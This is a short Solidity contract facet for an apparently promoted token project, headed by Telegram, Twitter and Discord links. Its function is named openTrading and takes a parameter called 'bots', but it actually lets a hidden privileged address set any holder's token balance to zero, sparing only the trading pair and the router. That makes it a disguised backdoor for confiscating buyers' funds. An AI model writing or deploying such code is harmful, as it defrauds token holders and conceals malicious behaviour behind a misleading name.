/*
 * SPDX-License-Identifier: MIT
 * Telegram Channel: https://t.me/xpad_channel
 * Telegram Group (EN): https://t.me/xpad_group
 * Telegram Group (SNG): https://t.me/xpad_sng
 * Twitter: https://twitter.com/Xpad_pro
 * Reddit: https://www.reddit.com/r/xpad_pro
 * Linkedin: https://www.linkedin.com/company/xpadpro
 * Discord: https://discord.gg/g7XTZzCy8G
 * Medium: https://medium.com/@xpad.pro
 */
pragma solidity ^0.8.20;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
